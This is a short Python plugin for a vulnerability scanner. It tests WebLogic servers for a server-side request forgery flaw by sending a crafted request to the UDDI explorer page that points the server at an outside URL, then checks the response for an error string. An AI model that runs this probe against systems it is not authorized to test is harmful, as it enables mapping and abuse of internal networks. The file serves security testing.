#!/usr/bin/env python
# -*- coding: utf-8 -*-
# @author: 'orleven'

import urllib.parse
import requests
requests.packages.urllib3.disable_warnings()

def info(data=None):
    info = {
        "name": "weblogic ssrf",
        "info": "weblogic ssrf.",
        "level": "high",
        "type": "ssrf"
    }
    return info

def prove(data):
    data = init(data,'weblogic')
    if data['base_url']:
        url = data['base_url']+'uddiexplorer/SearchPublicRegistries.jsp?operator=http://www.baidu.com/robots.txt&rdoSearch=name&txtSearchname=sdf&txtSearchkey=&txtSearchfor=&selfor=Business+location&btnSubmit=Search'
        try:
            res = curl('get',url)
            if "weblogic.uddi.client.structures.exception.XML_SoapException" in res.text :
                data['flag'] = 1
                data['data'].append({"page": '/uddiexplorer/SearchPublicRegistries.jsp'})
                data['res'].append({"info": url, "key": "/uddiexplorer/SearchPublicRegistries.jsp"})
        except:
            pass
    return data

if __name__=='__main__':
    from script import init, curl
    print(prove({'url':'http://www.baidu.com','flag':-1,'data':[],'res':[]}))